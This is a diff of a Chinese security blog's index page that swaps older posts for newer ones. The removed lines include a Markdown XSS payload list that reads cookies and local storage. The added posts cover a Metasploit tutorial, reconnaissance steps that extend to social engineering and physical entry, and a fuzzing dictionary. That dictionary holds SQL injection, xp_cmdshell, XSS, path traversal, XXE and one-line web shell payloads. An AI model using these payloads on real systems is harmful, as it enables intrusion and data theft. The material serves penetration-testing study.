@@ -111,7 +111,7 @@
         
             <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
         
-            <li><a href="Web%E5%AE%89%E5%85%A8.html">Web安全</a></li>
+            <li><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">渗透测试</a></li>
         
             <li><a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html">风花雪月</a></li>
         
@@ -138,39 +138,24 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15591786403220.html">
+                <a class="clearlink" href="15604965103558.html">
                 
-                  <h1>双因素覆盖不全</h1>
+                  <h1>Docker for Mac 卡在 "is starting"</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>这篇文章引用自【呆子不开口】在SDCC上的关于账号通行证安全相关的PPT。膜拜大佬</p>
+<p>解决方案来自：<a href="https://github.com/docker/for-mac/issues/2420">https://github.com/docker/for-mac/issues/2420</a> 中的sagidM的回复</p>
 </blockquote>
 
-<h2 id="toc_0">漏洞原理</h2>
+<p>本机环境：<br/>
+macOS 10.14.4<br/>
+Docker Engine: 18.09.2</p>
 
-<p>双因素后获取的凭证，在无需双因素处可以获得。</p>
+<p><figure><img src="media/15604965103558/15604966419596.jpg" alt=""/></figure></p>
 
-<h2 id="toc_1">常见的场景有：</h2>
-
-<p>1、web版登陆需要双因素认证，但app端却没跟上仍然可以用账号密码登陆<br/>
-2、在登陆处需要，在某些特殊功能处却可以通过特殊白名单参数绕过<br/>
-3、某些双因素认证后才能获得的凭证，可以在普通权限下通过某接口中获得</p>
-
-<p>案例：</p>
-
-<ul>
-<li>淘宝异地登录短信认证绕过</li>
-<li>某微博的双因素认证绕过</li>
-<li>某app移动端登录获取pc端双因素后的cookie</li>
-</ul>
-
-<h2 id="toc_2">修复方案</h2>
-
-<p>双因素认证后需要额外设置新的凭证<br/>
-并保证此凭证不在其他接口输出</p>
+<p>大意是，打开终端然后输入<code>screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty</code>，接着回车几次，就 ok 了。事实证明这个方法确实能解决问题。如果你输入一次没什么反应，就多开几个终端标签多试几次就可以了。</p>
 
                         
                       </div>
@@ -179,10 +164,10 @@
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/5/30 9:10 上午</span>
+                    <span class="date">2019/6/14 15:15 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -196,251 +181,46 @@
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15591049197350.html">
+                <a class="clearlink" href="15602308144902.html">
                 
-                  <h1>今日相思</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>耳机里播放着飞儿的《月牙湾》是谁的爱啊，比泪水坚强。轻声呼唤，就让我融化。每一滴雨水，演化成我翅膀。向着我爱的人，追吧。<br/>
-  有些爱没有回声，就像天雨无源落地无根。于是我把无法安置的相思写在了此处，随岁月缓缓蒸发，而远天方那片雪，也随光阴慢慢融化。</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/5/29 12:41 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html'>风花雪月</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15590908841596.html">
-                
-                  <h1>学习的深度和广度</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>深度非常重要，学习必需要做到精深至少一门学科或方向。</p>
-
-<p>但是对于精力旺盛和时间充裕的自学者来说，我还是建议广度优先。</p>
-
-<p>这里我想对自学者做个简单的解释，何为自学者？学习本来就是自己的事情，这句话没错，但是很多时候，或者说很多跨行或者零基础开始学习的同学，是没有相关学科或者相关方向的朋友以及交流对象的。所以很多时候，搜集学习资料、确定路线等很容易犯错，并为此付出大量的时间精力。</p>
-
-<p>学无止境，但人的勇气和精力有限。学习是为了自己，但是外因也不该忽视。</p>
-
-<p>因此，我认为初学者应该广度优先，在做深度研究之前，先开阔视野，了解一个领域的相关知识，然后你才知道自己是否喜欢或者是否合适（热爱就是合适、哪怕最后失败你也不会后悔），之后再进行深度学习。这样既能拥有开阔的视野不止于掉进迷茫的漩涡（可以随时纠正自己的方向不止于跑偏——自学者很容易迷失在知识的海洋中），同时理解新东西时能更好的触类旁通。就想运动是想通的一样，知识其实也是想通的。</p>
-
-<p>能做自己热爱的事情是一种幸福，受外力禁锢而做自己不喜欢的事情是很折磨的。如果你的目标不是为了得过且过而是为了改变世界（至少也是改变自己），那么，保持热情，坚持信念吧！</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/5/29 8:48 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html'>风花雪月</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15590262822391.html">
-                
-                  <h1>洞察-宜信集应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的平台的安装与使用</h1>
+                  <h1>Metasploit 完全使用教程</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p><a href="https://github.com/creditease-sec/insight">https://github.com/creditease-sec/insight</a> 感谢作者！</p>
+<p>计划写一个 msf 从安装到使用到编写 exploit 的教程，在这里留个坑。本文不适合新手，很多地方不会说的太细致。但是会说清楚。</p>
 </blockquote>
 
-<h2 id="toc_0">部署和启动 mysql in docker</h2>
+<h2 id="toc_0">环境搭建</h2>
 
-<p>1、首先安装 docker，这里略过</p>
+<p>1、安装 Postgresql<br/>
+2、安装 metasploit</p>
 
-<p>2、安装 mysql 的 docker 镜像<code>docker pull mysql:5.7.13</code></p>
+<p>关于 metasploit，linux 的话可以使用软件管理器安装；macosx 的话可以使用 brew 安装；windows 别装了，去学 linux 吧。</p>
 
-<p>3、启动 mysql，这里的 name 可以自行指定。</p>
+<p>如果用包管理器安装有问题，则去官网下载二进制文件安装或者 github 下载源码下来，然后给 install 可执行权限，再执行安装。</p>
 
-<pre class="line-numbers"><code class="language-text">docker run -d -p 127.0.0.1:6606:3306 \
---name open_source_mysqldb \
--e MYSQL_ROOT_PASSWORD=root \
-mysql:5.7.13
-</code></pre>
+<p>安装完成之后，使用 alias 命令将<code>/opt/metasploit-framework/bin ./msfconsole</code>（具体路径根据自己安装的实际情况选定）指定成<code>msf</code>，这样以后要用只需要在终端输入 msf 即可立即开始使用。</p>
 
-<p>4、查看已经启动的 docker 镜像，这里注意 name 后面要用到。<code>docker ps -a</code><br/>
-<figure><img src="media/15590262822391/15590264712809.jpg" alt=""/></figure></p>
+<h2 id="toc_1">使用入门</h2>
 
-<p>5、进入容器bash<code>docker exec -it open_source_mysqldb bash</code></p>
+<p>打开终端然后输入 msf 即可启动，如下图所示：<br/>
+<figure><img src="media/15602308144902/15602325257924.jpg" alt=""/></figure></p>
 
-<p>6、进入 mysql 并创建数据库和账号权限配置<br/>
-<code>mysql -h localhost -P 6606 -u root -p</code><br/>
-<figure><img src="media/15590262822391/15590267094981.jpg" alt=""/></figure></p>
+<p><figure><img src="media/15602308144902/15602325455212.jpg" alt=""/></figure></p>
 
-<pre class="line-numbers"><code class="language-text">mysql&gt; CREATE DATABASE IF NOT EXISTS vuldb DEFAULT CHARSET utf8 COLLATE utf8_general_ci;
-mysql&gt; grant all on vuldb.* to vuluser@&#39;%&#39; identified by &#39;vulpassword&#39;;
-mysql&gt; flush privileges;
-mysql&gt; quit
-</code></pre>
+<p>上图黄字部分表示当前 msf 版本，如果版本过低，请使用<code>msfupdate</code>进行升级（注意执行此命令时终端所在的目录）。</p>
 
-<p><figure><img src="media/15590262822391/15590267827107.jpg" alt=""/></figure></p>
+<h2 id="toc_2">使用 msf 进行信息收集</h2>
 
-<p>7、退出容器 bash<code>exit</code></p>
+<p>主动信息收集的第一步通常都是端口扫描</p>
 
-<h2 id="toc_1">部署和启动 APP</h2>
+<p><figure><img src="media/15602308144902/15602328461015.jpg" alt=""/></figure></p>
 
-<p>1、下载源码<br/>
-<code>$ git clone https://github.com/creditease-sec/insight.git</code></p>
+<p>首先查找端口扫描模块，命令<code>search portscan</code>，search 是个非常重要的命令，当我们需要扫描或者利用某个漏洞时，可以使用 search 命令来查找 msf 是否有相关模块。</p>
 
-<p>2、修改srcpm/config.py 配置文件</p>
-
-<ul>
-<li><p>修改公司邮箱后缀    </p>
-<pre class="line-numbers"><code class="language-text">#公司邮箱后缀限制，只能使用公司邮箱注册账号。
-CORP_MAIL = &#39;@qq.com&#39;
-</code></pre></li>
-<li><p>修改邮件CC抄送列表    </p>
-<pre class="line-numbers"><code class="language-text">#平台发送的每封邮件的邮件抄送列表，可以设置发送给安全部邮箱列表，可自行修改，也可以保持不变为空
-&#39;&#39;&#39;<br/>
-示例：<br/>
-CC_EMAIL = [&#39;xxx1@creditease.cn&#39;,<br/>
-            &#39;xxx2@creditease.cn&#39;,<br/>
-        ]<br/>
-&#39;&#39;&#39;<br/>
-CC_EMAIL = [<br/>
-        ]<br/>
-        ```
-</code></pre></li>
-</ul>
-
-<ul>
-<li><p>修改开发模式的邮箱服务器和发件邮箱配置    </p>
-<pre class="line-numbers"><code class="language-text"># 以开发模式的配置运行，使用测试邮件服务器，并开启debug模式
-# 平台发邮件账号设置<br/>
-SRCPM_MAIL_SENDER = &#39;安全部 &lt;sec_creditease@sina.com&gt;&#39;<br/>
-# 发送邮件的服务器设置，邮箱密码由系统变量中读取<br/>
-MAIL_SERVER = &#39;smtp.sina.com&#39;<br/>
-MAIL_PORT = 587<br/>
-MAIL_USE_TLS = True<br/>
-MAIL_USERNAME = os.environ.get(<br/>
-    &#39;MAIL_USERNAME&#39;) or &#39;sec_creditease@sina.com&#39;<br/>
-MAIL_PASSWORD = os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;
-</code></pre></li>
-<li><p>修改生产模式的邮箱服务器和发件邮箱配置</p>
-<pre class="line-numbers"><code class="language-text"># 以生产模式的配置运行，使用生产邮件服务器，并关闭debug模式
-# 平台发邮件账号设置<br/>
-SRCPM_MAIL_SENDER = &#39;安全部 &lt;xxx@creditease.cn&gt;&#39;<br/>
-# 发送邮件的服务器设置，账号密码由系统变量中读取<br/>
-MAIL_SERVER = &#39;x.x.x.x&#39;<br/>
-MAIL_PORT = 25<br/>
-MAIL_USE_TLS = False<br/>
-MAIL_USERNAME = os.environ.get(<br/>
-    &#39;MAIL_USERNAME&#39;) or &#39;xxx@creditease.cn&#39;<br/>
-MAIL_PASSWORD = os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;
-</code></pre></li>
-</ul>
-
-<p>3、修改定时周期邮件 mail_sender.py 的配置    </p>
-
-<pre class="line-numbers"><code class="language-text">    #平台发送的每封邮件的邮件抄送列表，可以设置发送给安全部邮箱列表，可自行修改，也可以保持不变为空
-    &#39;&#39;&#39;
-    示例：
-    CC_EMAIL = [&#39;xxx1@creditease.cn&#39;,
-                &#39;xxx2@creditease.cn&#39;,
-            ]
-    &#39;&#39;&#39;
-    CC_EMAIL = [
-            ]
-    #主机名设置
-    SERVER_NAME = &#39;xxx.creditease.corp&#39;
-    # 平台发邮件账号设置
-    SRCPM_MAIL_SENDER = &#39;安全部 &lt;xxx@creditease.cn&gt;&#39;
-    # 发送邮件的服务器设置，账号密码由系统变量中读取
-    MAIL_SERVER = &#39;x.x.x.x&#39;
-    MAIL_PORT = 25
-    MAIL_USE_TLS = False
-    MAIL_USERNAME = os.environ.get(
-        &#39;MAIL_USERNAME&#39;) or &#39;xxx@creditease.cn&#39;
-    MAIL_PASSWORD = os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;
-</code></pre>
-
-<p>4、修改srcpm/app/src/forms.py 漏洞来源下拉列表    </p>
-
-<pre class="line-numbers"><code class="language-text">    &#39;&#39;&#39; 下拉选项 &#39;&#39;&#39;
-    source_choices = [(&#39;&#39;,&#39;&#39;), (u&#39;安全部&#39;, u&#39;安全部&#39;), (u&#39;YISRC&#39;, u&#39;YISRC&#39;), (u&#39;公众平台&#39;, u&#39;公众平台&#39;), (u&#39;合作伙伴&#39;, u&#39;合作伙伴&#39;)]
-</code></pre>
-
-<p>5、在项目根目录下部署和启动APP    </p>
-
-<pre class="line-numbers"><code class="language-text"># 拉取镜像
-docker pull daocloud.io/liusheng/vulpm_docker:latest
-或
-自己构建镜像
-docker build -t=&#39;vulpm_docker&#39; .
-# 在项目目录下启动容器，确保当前目录下存在srcpm文件夹，MAIL_PASSOWRD替换为自己邮箱服务器的密码。
-$ docker run -d -p 127.0.0.1:9000:5000 \
---link open_source_mysqldb:db \
---name open_source_srcpm \
--v $PWD/srcpm:/opt/webapp/srcpm \
--e DEV_DATABASE_URL=&#39;mysql://vuluser:vulpassword@db/vuldb&#39; \
--e SrcPM_CONFIG=development \
--e MAIL_PASSWORD=&#39;xxxxxx&#39; \
-daocloud.io/liusheng/vulpm_docker:latest \
-sh -c &#39;supervisord -c srcpm/supervisor.conf &amp;&amp; supervisorctl -c srcpm/supervisor.conf start all &amp;&amp; tail -f srcpm/log/gunicorn.err &amp;&amp; tail -f srcpm/log/mail_sender.err&#39;
-</code></pre>
-
-<h1 id="toc_2">初始化数据库</h1>
-
-<p>参考作者写的就可以了。</p>
-
-<p><a href="https://github.com/creditease-sec/insight/blob/open-source/docs/db_init.md">数据库初始化详细配置指南</a></p>
-
-<p>或者</p>
-
-<p>直接导入初始化的sql</p>
-
-<p>导入sql</p>
-
-<pre class="line-numbers"><code class="language-text">$ mysql -h127.0.0.1 -P6606 -uroot -p vuldb &lt; srcpm/vuldb_init.sql
-</code></pre>
-
-<p>Enter password:root</p>
-
-<h2 id="toc_3">搭建完成</h2>
-
-<p>访问域名：<a href="http://127.0.0.1:9000/srcpm/">http://127.0.0.1:9000/srcpm/</a> 即可<br/>
-账号：<a href="mailto:admin@admin.com">admin@admin.com</a><br/>
-密码：11</p>
+<p>（未完待续）</p>
 
                         
                       </div>
@@ -449,10 +229,10 @@ sh -c &#39;supervisord -c srcpm/supervisor.conf &amp;&amp; supervisorctl -c srcp
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/5/28 14:51 下午</span>
+                    <span class="date">2019/6/11 13:26 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -466,28 +246,43 @@ sh -c &#39;supervisord -c srcpm/supervisor.conf &amp;&amp; supervisorctl -c srcp
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15589173721679.html">
+                <a class="clearlink" href="15597856399146.html">
                 
-                  <h1>svn 报错：“svn: E155015: Commit failed (details follow):svn: E155015: Aborting commit: '/Users/lonelyor/xxx.xls' remains in conflict” 解决方法</h1>
+                  <h1>黑盒测试中的信息收集</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<blockquote>
-<p>解决方案来自：<a href="https://stackoverflow.com/questions/2406469/svn-remains-in-conflict">https://stackoverflow.com/questions/2406469/svn-remains-in-conflict</a></p>
-</blockquote>
+                        	<p>信息搜集分为主动搜集和被动搜集，主动搜集会惊动资产方因此需要有所针对，动静越小越好；而被动搜集不会惊动资产方因此更为隐蔽。</p>
 
-<p>1、执行 svn resolved /Users/lonelyor/xxx.xlsx<br/>
-2、svn update<br/>
-3、svn commit -m &quot;xxxxxx&quot;</p>
+<h2 id="toc_0">第一阶段：资产（域名及子域名）搜集</h2>
 
-<p>搞定，可以正常执行 commit 操作。</p>
+<p>1、确认目标性质：了解网站所在行业，他是一个黑产赌博色情站、还是政府学校官方站、亦或是金融游戏商业站。了解这类网站通常的安全关注点在哪，那么避开其关注点，就是它的薄弱点。</p>
 
-<pre class="line-numbers"><code class="language-text">Sending        xxx.xlsx
-Transmitting file data .done
-Committing transaction...
-Committed revision 1135.
-</code></pre>
+<p>2、收集目标资产 1：使用搜索引擎搜索关键词（公司名、域名等），找出搜索引擎搜录的相关域名，这里可以用一些现成的工具或者自写爬虫</p>
+
+<p>3、收集目标资产 2：使用子域名扫描器，根据 2 中搜集来的域名进一步进行资产收集。</p>
+
+<p>4、收集目标资产 3：使用爬虫在 3 所在的页面中爬取隐藏页面或引用的 url。</p>
+
+<p>信息搜集是层层递进的，根据上一次收集的信息来进行扩展，尽可能多的收集目标资产、扩大打击面。</p>
+
+<h2 id="toc_1">第二阶段：资产属性收集</h2>
+
+<p>5、得到域名和 ip 相关信息后，对资产进行端口扫描、敏感目录（包括后台、备份文件、隐藏接口、邮箱系统、运维自带后门、github 或网盘泄露等）扫描、GoogleHacking（快照信息、已知后门、代码泄露、已知安全事件）、操作系统版本（win、linux）、web 应用服务器版本（nginx、apache、tomcat 等）、后端框架（spring、flask、thinkphp 等）、网络拓扑（多少主机、路由、交换、网段、DNS服务器等）、防御软硬件信息（防火墙、waf、网闸等）等。并一一记录资产对应的信息。这里还有些值得注意的信息就是：邮箱、手机号、身份证号等个人敏感信息。</p>
+
+<p>6、分析信息并对有效信息进行提取和记录。</p>
+
+<p>比如你可以这样来记录（这只是个例子，信息收集自然是越详细越好）：<br/>
+<figure><img src="media/15597856399146/15598028215198.jpg" alt=""/></figure></p>
+
+<h2 id="toc_2">第三阶段：资产攻击面分析</h2>
+
+<p>7、收集了各种信息后，就是分析各个资产可能存在的防御薄弱点、分析攻击面。可以从软硬件漏洞、业务、人三个方向来进行分析。</p>
+
+<p>8、收集攻击相关工具、字典等，针对可入侵性高的攻击面进行攻击，此时会获得攻击工具的部分反馈。根据反馈我们可以更好地了解对方的防御措施和脆弱点。根据不同的攻击行为，系统会有不同的反应，分析这些信息对后续展开更深层次的攻击也是有积极意义的。</p>
+
+<p>基本上，到这里，我们就可以开始展开针对性的攻击了。如果物理上离目标近，还可以使用钓鱼二维码、社工、应聘、潜入停车场、办公区域，若网络未做内外网隔离还可以连接办公室 wifi 等方式（连接 wifi 这个绝对是大杀器）。</p>
 
                         
                       </div>
@@ -496,10 +291,10 @@ Committed revision 1135.
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/5/27 8:36 上午</span>
+                    <span class="date">2019/6/6 9:47 上午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -513,60 +308,240 @@ Committed revision 1135.
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15586769387988.html">
+                <a class="clearlink" href="15596178265897.html">
                 
-                  <h1>Markdown XSS Payloads</h1>
+                  <h1>业务逻辑漏洞安全检查checklist</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
+<p>未公开整理好的 checklist 全部内容，也不打算全部公开。</p>
 </blockquote>
 
-<p>Links</p>
+<h2 id="toc_0">认证</h2>
 
-<pre class="line-numbers"><code class="language-md">[Basic](javascript:alert(&#39;Basic&#39;))
-[Local Storage](javascript:alert(JSON.stringify(localStorage)))
-[CaseInsensitive](JaVaScRiPt:alert(&#39;CaseInsensitive&#39;))
-[URL](javascript://www.google.com%0Aalert(&#39;URL&#39;))
-[In Quotes](&#39;javascript:alert(&quot;InQuotes&quot;)&#39;)
-</code></pre>
+<p>图形验证码问题（验证码缺失、验证码回显、验证码绕过、验证流程不正确、重放攻击）<br/>
+手机验证码（短信轰炸、验证码劫持）<br/>
+会话固定<br/>
+cookie 伪造/爆破<br/>
+使用默认凭证（管理后台、数据库密码）<br/>
+冻结账户策略不当<br/>
+弱用户名和密码<br/>
+“记住我”功能缺陷（前端记住/发送密码）<br/>
+自动登录<br/>
+单点登录劫持<br/>
+第三方登录劫持<br/>
+二维码登录劫持<br/>
+弱口令<br/>
+弱安全问题/答案<br/>
+弱的密码恢复机制<br/>
+Oauth2.0授权漏洞<br/>
+JWT安全<br/>
+注册覆盖<br/>
+未验证的重定向和转发<br/>
+双因素认证不当（双因素后获取的凭证，在无需双因素处可以获得）<br/>
+恶意注册</p>
 
-<p>Images</p>
+<h2 id="toc_1">授权</h2>
 
-<pre class="line-numbers"><code class="language-md">![Escape SRC - onload](https://www.example.com/image.png&quot;onload=&quot;alert(&#39;ImageOnLoad&#39;))
-![Escape SRC - onerror](&quot;onerror=&quot;alert(&#39;ImageOnError&#39;))
-</code></pre>
+<p>测试角色定义（授权不当）<br/>
+权限管理缺失（无权限设计）<br/>
+匿名访问（备用接口——常见于兼容老的不安全的接口时产生）<br/>
+水平越权<br/>
+垂直越权<br/>
+超级账户<br/>
+实名认证不严格</p>
 
-<p>Fuzzing</p>
+<h2 id="toc_2">会话管理</h2>
 
-<pre class="line-numbers"><code class="language-md">[XSS](javascript:prompt(document.cookie))
-[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)
-[XSS]: (javascript:prompt(document.cookie))
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0aprompt(1))
-[XSS](javascript://%0d%0aprompt(1);com)
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](vbscript:alert(document.domain))
-[XSS](javascript:this;alert(1))
-[XSS](javascript:this;alert(1&amp;#41;)
-[XSS](javascript&amp;#58this;alert(1&amp;#41;)
-[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)
-[XSS](Javas%26%2399;ript:alert(1&amp;#41;)
-[XSS](javascript:alert&amp;#65534;(1&amp;#41;)
-[XSS](javascript:confirm(1)
-[XSS](javascript://www.google.com%0Aprompt(1))
-[XSS](javascript://%0d%0aconfirm(1);com)
-[XSS](javascript:window.onerror=confirm;throw%201)
-[XSS](�javascript:alert(document.domain&amp;#41;)
-![XSS](javascript:prompt(document.cookie))\
-![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-![XSS&#39;&quot;`onerror=prompt(document.cookie)](x)\
+<p>cookie安全属性<br/>
+cookie可猜解/伪造<br/>
+cookie溢出<br/>
+会话固定漏洞<br/>
+用户凭证不安全传输（弱加密或明文传输）<br/>
+用户凭证未一次失效<br/>
+用户凭证可猜解<br/>
+注销与会话超时<br/>
+敏感数据不安全传输（get 方法传输 session）</p>
+
+<h2 id="toc_3">内容安全</h2>
+
+<p>敏感信息过度显示<br/>
+违法违规信息</p>
+
+<h2 id="toc_4">设计缺陷</h2>
+
+<p>业务一致性（篡改类）漏洞（订单 id、邮箱或用户名、手机号、商品编号、用户 id、支付金额、优惠券金额、商品数量、最大数限制、前端限制绕过）<br/>
+刷赞、刷关注、刷票、刷奖品<br/>
+流程绕过（密码找回、支付、登录验证）</p>
+
+<h2 id="toc_5">典型场景</h2>
+
+<p>个人信息<br/>
+密码找回/修改<br/>
+支付流程<br/>
+注册流程<br/>
+需要手机/邮箱验证的业务</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/6/4 11:10 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15596171974228.html">
+                
+                  <h1>最近做了个 fuzzing 字典精简版</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>仅用于学习目的，请勿进行违法犯罪活动，也不要用来扫描别人系统，扫描未授权的计算机是犯法的。<br/>
+本字典可以用来检测（不保证效果、payload 自行琢磨修改）：sql 注入、xss、敏感目录泄露、敏感文件泄露、iis 短文件名、xml 注入、ssrf、远程命令执行、未验证的 url 跳转、任意文件读取等。</p>
+</blockquote>
+
+<pre class="line-numbers"><code class="language-text">&#39;
+&quot;
+[
+@
+#
+%
+&amp;
+*
+(
+)
+]
+/
+??
+//
+\\
+../
+&lt;!-- 
+%20select @@version
+)%20or%20(&#39;x&#39;=&#39;x
+%20or &#39;a&#39;=&#39;a
+%20or 2 &gt; 1
+%20or &#39;a&#39;=&#39;a
+%20or 1=1
+%20and%201=1
+%20and%201=2
+/**/or/**/1/**/=/**/1
+select &#39;10as&#39;=10;
+exec master..xp_cmdshell &#39;ipconfig+/all&#39;
+%20or &#39;7659&#39;=&#39;7659
+%20or &#39;text&#39; = n&#39;text&#39;
+) union select * from information_schema.tables;
+1+AND+USER_NAME()=’dbo’
+1;waitfor+delay+’0:0:10’
+1’;shutdown –
+as
+%20select 1/*!50000union/*!*//*!50000select/*!*/2;
+%20or 0=0 #&quot;
+&#39; union (select @@version) --
+&#39; union (select NULL, (select @@version)) --
+&#39; union (select NULL, NULL, (select @@version)) --
+&#39; union (select NULL, NULL, NULL,  (select @@version)) --
+&#39; union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+&#39; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+--
+/*
+1’; insert into users values(‘lonelyor’,’lonelyor’)
+%28
+%29
+&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;
+&lt;script&gt;alert(8888)&lt;/script&gt;
+&lt;script&gt;confirm(8866)&lt;/script&gt;
+&lt;script&gt;prompt(8877)&lt;/script&gt;
+a&lt;img src=1 onerror=alert(1)&gt;a
+&lt;img src=x onerror=alert(11)&gt;29
+&lt;anytag onmouseover=alert(1)&gt;s
+&quot;&gt;&lt;img/onload=alert(1)&gt;&#39; -- 
+&lt;video onloadstart=alert(1)&gt;&lt;source&gt;
+&lt;a onclick=alert(2)&gt;h
+&lt;button/onclick=alert(6)&gt;h
+&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;
+&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;
+&lt;body/onload=alert(12)&gt;
+&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+.git
+.gitignore
+.svn
+wp-admin
+wp-login.php
+.DS_store
+.ds_store
+index.php.bak
+.index.php~
+index.php.~
+robots.txt
+.git/config
+admin/
+/admin
+uploads/
+download/
+downloads/
+manager/
+/include
+1.jsp
+hack.jsp
+1.php
+1.asp
+/新建文本文档.txt
+/etc/passwd
+etc/passwd
+../../../../etc/passwd
+/../../../../etc/passwd
+..2f..2fetc2fpasswd
+&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:///etc/
+&lt;%eval request(chr(35))%&gt;
+&lt;?=eval($_POST[&#39;cmd&#39;]);
+cmd
+system(&quot;ls -al /&quot;)
+%s%s%s%s%s%s%s%s%s%s
+NULL
+null
+zull
+/C:\Program Files\
+C:\Program Files\
+&lt;!--#exec cmd=&quot;ls&quot; --&gt;
+&lt;!--#exec cmd=&quot;dir&quot; --&gt;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
